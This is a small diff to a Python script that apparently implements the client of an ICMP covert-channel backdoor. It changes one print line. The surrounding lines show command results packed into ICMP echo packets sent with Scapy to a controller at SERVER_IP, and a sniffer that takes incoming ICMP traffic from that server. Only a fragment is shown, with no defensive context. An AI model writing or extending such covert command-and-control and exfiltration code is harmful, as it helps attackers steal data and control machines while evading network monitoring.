@@ -52,7 +52,7 @@ def run_task(cmd):
     pkt = IP(dst=SERVER_IP)/ICMP(type=8)/payload
     send(pkt, verbose=0)
 
-    print(f"[+] Sent results")
+    print(f"[+] Sent results: {payload}")
 
 if __name__ == "__main__":
     sniffer = AsyncSniffer(filter=f"icmp and src {SERVER_IP}", prn=handle_incoming, store=False)
